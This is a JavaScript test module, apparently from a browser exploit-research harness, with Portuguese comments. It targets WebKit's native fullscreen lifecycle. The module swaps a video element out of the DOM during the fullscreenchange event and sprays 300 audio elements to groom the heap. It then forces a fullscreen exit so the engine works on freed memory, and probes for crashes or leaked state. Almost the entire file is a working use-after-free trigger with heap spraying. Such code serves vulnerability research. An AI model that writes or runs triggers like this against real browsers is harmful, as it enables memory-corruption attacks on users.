import { Groomer } from '../mod_groomer.js';

export default {
    id:       'VIDEO_NATIVE_FS_SWAP',
    category: 'Media',
    risk:     'CRITICAL',
    description:
        'Ataca o ciclo de vida (Teardown) do Fullscreen Nativo. Escutamos o evento ' +
        'de mudança e trocamos (swap) o elemento <video> por um elemento vazio no DOM. ' +
        'O controlador tenta sair do modo nativo operando sobre ponteiros desajustados.',

    setup: function() {
        this.results = {};
        this.container = document.createElement('div');
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQA=';
        
        this.container.appendChild(this.video);
        document.body.appendChild(this.container);

        const self = this;
        
        // A ARMADILHA: Quando o C++ anunciar a mudança, nós trocamos a memória debaixo dos pés dele
        this.handler = function() {
            self.results.eventFired = true;
            try {
                // Trocamos o vídeo gigante por um span minúsculo!
                let span = document.createElement('span');
                self.container.replaceChild(span, self.video);
                
                // Forçamos lixo para sobrepor a memória do vídeo
                let trash = Groomer.sprayDOM('audio', 300);
            } catch(e) {}
        };
        
        this.video.addEventListener('webkitfullscreenchange', this.handler);
    },

    trigger: function() {
        try {
            // 1. Tenta entrar
            if (this.video.webkitEnterFullscreen) this.video.webkitEnterFullscreen();
            
            // 2. Dispara o evento manualmente para forçar o Handler se o C++ bloquear a entrada
            let event = new Event('webkitfullscreenchange');
            this.video.dispatchEvent(event);

            // 3. Tenta sair instantaneamente. O C++ agora vai operar num <span/> ou num vídeo "freed"!
            if (this.video.webkitExitFullscreen) this.video.webkitExitFullscreen();

        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O evento disparou e a troca (swap) aconteceu?
        s => s.results.eventFired ? 'Swap Executado' : 'Falha no Swap',
        
        // Probe 1: Tenta ler o state do vídeo. O Wrapper pode crashar ou ler lixo da RAM.
        s => {
            try {
                let state = s.video.readyState;
                if (state > 4 || state < 0) return `💥 INFO LEAK Bruto: ${state}`;
                return 'Estado Seguro';
            } catch(e) {
                return `Crash do Wrapper C++`;
            }
        }
    ],

    cleanup: function() {
        try { this.video.removeEventListener('webkitfullscreenchange', this.handler); } catch(e){}
        try { this.container.remove(); } catch(e){}
        this.video = null;
        this.container = null;
        this.results = {};
    }
};
